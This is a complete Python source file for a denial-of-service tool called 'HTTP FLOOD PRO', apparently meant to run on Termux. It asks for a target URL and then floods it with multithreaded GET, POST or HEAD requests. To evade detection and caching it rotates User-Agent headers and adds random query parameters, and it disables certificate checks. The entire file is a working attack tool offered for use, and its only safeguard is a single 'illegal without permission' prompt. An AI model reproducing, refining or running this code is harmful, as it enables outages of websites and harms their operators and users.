import requests
import threading
import random
import time
import argparse
import os
import sys
from colorama import Fore, Style, init
import traceback
import urllib3

# Initialize colorama with strip=True for better Termux compatibility
# strip=False menghasilkan output yang lebih baik dalam beberapa terminal yang mendukung ANSI escape codes
init(autoreset=True, strip=False)

# Disable SSL warnings (use with caution!)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# Class to store attack statistics
class AttackStats:
    def __init__(self):
        self.requests_sent = 0
        self.bytes_received = 0
        self.start_time = time.time()
        self.lock = threading.Lock()

    def update(self, requests, bytes_received):
        with self.lock:
            self.requests_sent += requests
            self.bytes_received += bytes_received

    def get_stats(self):
        duration = time.time() - self.start_time
        with self.lock:
            rps = self.requests_sent / duration if duration > 0 else 0
            mbps = (self.bytes_received * 8 / 1_000_000) / duration if duration > 0 else 0
            return {
                "requests": self.requests_sent,
                "bytes": self.bytes_received,
                "duration": duration,
                "rps": rps,
                "mbps": mbps
            }


# Global statistics
stats = AttackStats()


# HTTP Flood with custom headers and configurable method (No Root Required)
def http_flood(url, method="GET", headers=None, data=None, interval=0):
    if headers is None:
        # Random User-Agent to avoid detection
        headers = {
            "User-Agent": random.choice([
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.0; rv:120.0) Gecko/20100101 Firefox/120.0",
                "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
            ]),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache"
        }

    session = requests.Session()

    while True:
        try:
            # Add random parameters to URL to avoid cache
            target_url = url
            if "?" not in url:
                target_url += f"?cache={random.randint(1, 999999)}"
            else:
                target_url += f"&cache={random.randint(1, 999999)}"

            # Make request based on method
            if method.upper() == "GET":
                response = session.get(target_url, headers=headers, timeout=5, verify=False)
            elif method.upper() == "POST":
                response = session.post(target_url, headers=headers, data=data, timeout=5, verify=False)
            elif method.upper() == "HEAD":
                response = session.head(target_url, headers=headers, timeout=5, verify=False)
            else:
                print(f"{Fore.RED}[HTTP] Invalid method: {method}{Style.RESET_ALL}")
                break

            content_length = len(response.content) if hasattr(response, 'content') else 0

            # Update statistics
            stats.update(1, content_length)

            # Use print without clearing screen for better Termux compatibility
            print(f"{Fore.CYAN}[HTTP {method}] Attacking {url} - Status: {response.status_code} - {content_length} bytes{Style.RESET_ALL}")

            # Interval between requests
            if interval > 0:
                time.sleep(interval)

        except requests.exceptions.RequestException as e:
            print(f"{Fore.RED}[HTTP] Request Error: {str(e)}{Style.RESET_ALL}")  # More specific error message
            time.sleep(2)
        except Exception as e:
            print(f"{Fore.RED}[HTTP] Unexpected error: {str(e)}{Style.RESET_ALL}")
            traceback.print_exc()
            time.sleep(2)
        except KeyboardInterrupt:
            print(f"{Fore.CYAN}[INFO] HTTP Flood stopped.{Style.RESET_ALL}")
            break


# Function to display statistics periodically
def display_stats():
    while True:
        try:
            time.sleep(2)
            stats_data = stats.get_stats()

            # Use simpler stats display for better Termux compatibility
            print(f"\n{Fore.CYAN}===== ATTACK STATISTICS ====={Style.RESET_ALL}")
            print(f"{Fore.WHITE}Requests Sent: {stats_data['requests']:,}{Style.RESET_ALL}")
            print(f"{Fore.WHITE}Bytes Received: {stats_data['bytes']:,}{Style.RESET_ALL}")
            print(f"{Fore.WHITE}Duration: {stats_data['duration']:.2f} seconds{Style.RESET_ALL}")
            print(f"{Fore.WHITE}Speed: {stats_data['rps']:.2f} requests/second{Style.RESET_ALL}")
            print(f"{Fore.WHITE}Bandwidth: {stats_data['mbps']:.2f} Mbps{Style.RESET_ALL}")
            print(f"{Fore.CYAN}=============================={Style.RESET_ALL}\n")

        except Exception as e:
            print(f"{Fore.RED}[STATS] Error displaying stats: {str(e)}{Style.RESET_ALL}")
            traceback.print_exc() # Tambahkan traceback di sini
            time.sleep(5)
        except KeyboardInterrupt:
            print(f"{Fore.CYAN}[INFO] Statistics display stopped.{Style.RESET_ALL}")
            break


# Function to check if host is alive
def check_target(target):
    try:
        if "://" in target:
            # Check if target is a URL
            response = requests.head(target, timeout=5, verify=False)
            print(f"{Fore.GREEN}[INFO] Target is up: {target} - Status: {response.status_code}{Style.RESET_ALL}")
            return True
        else:
            # Check if target is a URL (assume as domain)
            target_url = f"http://{target}"  # Try HTTP first
            try:
                response = requests.head(target_url, timeout=5, verify=False)
                print(f"{Fore.GREEN}[INFO] Target is up: {target_url} - Status: {response.status_code}{Style.RESET_ALL}")
                return True
            except requests.exceptions.RequestException:
                target_url = f"https://{target}"  # Try HTTPS if HTTP fails
                try:
                    response = requests.head(target_url, timeout=5, verify=False)
                    print(f"{Fore.GREEN}[INFO] Target is up: {target_url} - Status: {response.status_code}{Style.RESET_ALL}")
                    return True
                except requests.exceptions.RequestException:
                    print(f"{Fore.RED}[INFO] Target not responding: {target}{Style.RESET_ALL}")
                    return False
    except Exception as e:
        print(f"{Fore.RED}[INFO] Cannot reach target: {str(e)}{Style.RESET_ALL}")
        return False


# Help menu
def print_help():
    print(f"""
{Fore.CYAN}===========================================
{Fore.WHITE}              USAGE HELP
{Fore.CYAN}===========================================
{Fore.WHITE} 1. HTTP Flood: Perform HTTP requests to target
{Fore.WHITE}
{Fore.YELLOW} Additional parameters:
{Fore.WHITE}   -t [number]   : Number of threads
{Fore.WHITE}   -i [interval] : Interval between requests (seconds)
{Fore.WHITE}   -d [number]   : Attack duration in seconds (0 for unlimited)
{Fore.CYAN}===========================================
    """)


# Main function
def main():
    # Create argument parser
    parser = argparse.ArgumentParser(description="DDoS Tool - HTTP Flood (No Root)", add_help=False)
    parser.add_argument("-h", "--help", action="store_true", help="Show help")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads")
    parser.add_argument("-i", "--interval", type=float, default=0, help="Interval between requests (seconds)")
    parser.add_argument("-d", "--duration", type=int, default=0, help="Attack duration (seconds)")

    # Try to parse arguments (if any) or continue to menu mode
    try:
        args, unknown = parser.parse_known_args()
        if args.help:
            print_help()
            return
    except:
        args = parser.parse_args([])

    # Display banner (simplified for Termux)
    print(f"""
{Fore.CYAN}===========================================
{Fore.RED}               HTTP FLOOD PRO
{Fore.WHITE}     Layer 7 Attack Tool (No Root)
{Fore.YELLOW}          Created by: XX3T1
{Fore.CYAN}===========================================
{Style.RESET_ALL}
    """)

    # Input target
    target = input(f"{Fore.WHITE}[?] Enter target URL or domain: {Style.RESET_ALL}")

    if not target:
        print(f"{Fore.RED}[ERROR] Target cannot be empty!{Style.RESET_ALL}")
        return

    # Check if target is reachable
    if not check_target(target):
        confirm = input(f"{Fore.YELLOW}[!] Target not responding. Continue? (y/n): {Style.RESET_ALL}").lower()
        if confirm != 'y':
            print(f"{Fore.YELLOW}[INFO] Operation cancelled.{Style.RESET_ALL}")
            return

    # Input parameters
    thread_count = args.threads
    try:
        input_threads = input(f"{Fore.WHITE}[?] Number of threads (default: {thread_count}): {Style.RESET_ALL}")
        if input_threads:
            thread_count = int(input_threads)
    except ValueError:
        print(f"{Fore.YELLOW}[WARN] Invalid input, using default value: {thread_count}{Style.RESET_ALL}")

    interval = args.interval
    try:
        input_interval = input(f"{Fore.WHITE}[?] Interval between requests in seconds (default: {interval}): {Style.RESET_ALL}")
        if input_interval:
            interval = float(input_interval)
    except ValueError:
        print(f"{Fore.YELLOW}[WARN] Invalid input, using default value: {interval}{Style.RESET_ALL}")

    # Set up complete URL
    url = target
    # Make sure URL has protocol
    if not url.startswith(('http://', 'https://')):
        protocol = input(f"{Fore.WHITE}[?] Protocol (1=HTTP, 2=HTTPS, default=1): {Style.RESET_ALL}")
        if protocol == '2':
            url = f"https://{url}"
        else:
            url = f"http://{url}"

    # Add path if user wants
    path = input(f"{Fore.WHITE}[?] Path (default='/'): {Style.RESET_ALL}")
    if path and not path.startswith('/'):
        path = f"/{path}"
    if path:
        url = f"{url}{path}"
    elif not url.endswith('/'):
        url = f"{url}/"

    # Choose HTTP method
    print(f"""
{Fore.WHITE}[{Fore.CYAN}1{Fore.WHITE}] GET
{Fore.WHITE}[{Fore.CYAN}2{Fore.WHITE}] POST
{Fore.WHITE}[{Fore.CYAN}3{Fore.WHITE}] HEAD
{Style.RESET_ALL}
    """)

    http_method = "GET"
    method_choice = input(f"{Fore.WHITE}[?] Choose HTTP method (default=1): {Style.RESET_ALL}")
    if method_choice == '2':
        http_method = "POST"
    elif method_choice == '3':
        http_method = "HEAD"

    # Attack duration (if specified)
    duration = args.duration
    try:
        input_duration = input(f"{Fore.WHITE}[?] Attack duration in seconds (0=unlimited): {Style.RESET_ALL}")
        if input_duration:
            duration = int(input_duration)
    except ValueError:
        print(f"{Fore.YELLOW}[WARN] Invalid input, using default value: unlimited{Style.RESET_ALL}")

    # Confirm attack
    print(f"""
{Fore.YELLOW}===========================================
{Fore.WHITE}            ATTACK DETAILS
{Fore.YELLOW}===========================================
{Fore.WHITE} Target    : {url}
{Fore.WHITE} Threads   : {thread_count}
{Fore.WHITE} Mode      : HTTP Flood
{Fore.WHITE} Method    : {http_method}
{Fore.WHITE} Duration  : {duration} seconds
{Fore.YELLOW}===========================================
{Style.RESET_ALL}
    """)

    confirm = input(f"{Fore.RED}[!] WARNING: DDoS attacks are illegal without permission! Continue? (y/n): {Style.RESET_ALL}").lower()
    if confirm != 'y':
        print(f"{Fore.YELLOW}[INFO] Operation cancelled.{Style.RESET_ALL}")
        return

    print(f"{Fore.GREEN}[INFO] Starting attack...{Style.RESET_ALL}")

    # Start thread for displaying statistics
    stats_thread = threading.Thread(target=display_stats, daemon=True)
    stats_thread.start()

    # Start attack threads
    threads = []
    try:
        for _ in range(thread_count):
            thread = threading.Thread(target=http_flood, args=(url, http_method, None, None, interval), daemon=True)
            threads.append(thread)
            thread.start()
    except Exception as e:
        print(f"{Fore.RED}[ERROR] Error creating attack threads: {e}{Style.RESET_ALL}")
        traceback.print_exc()
        return

    # Wait until duration ends or press CTRL+C to stop
    if duration > 0:
        try:
            print(f"{Fore.YELLOW}[INFO] Attack will stop in {duration} seconds. Press CTRL+C to stop earlier.{Style.RESET_ALL}")
            time.sleep(duration)
            print(f"{Fore.GREEN}[INFO] Attack completed (duration {duration} seconds).{Style.RESET_ALL}")
        except KeyboardInterrupt:
            print(f"{Fore.YELLOW}[INFO] Attack interrupted by user.{Style.RESET_ALL}")
    else:
        try:
            print(f"{Fore.YELLOW}[INFO] Attack running. Press CTRL+C to stop.{Style.RESET_ALL}")
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print(f"{Fore.YELLOW}[INFO] Attack interrupted by user.{Style.RESET_ALL}")

    print(f"{Fore.GREEN}[INFO] Attack stopped.{Style.RESET_ALL}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[INFO] Program stopped by user.{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}[ERROR] An unexpected error occurred: {str(e)}{Style.RESET_ALL}")
        traceback.print_exc()
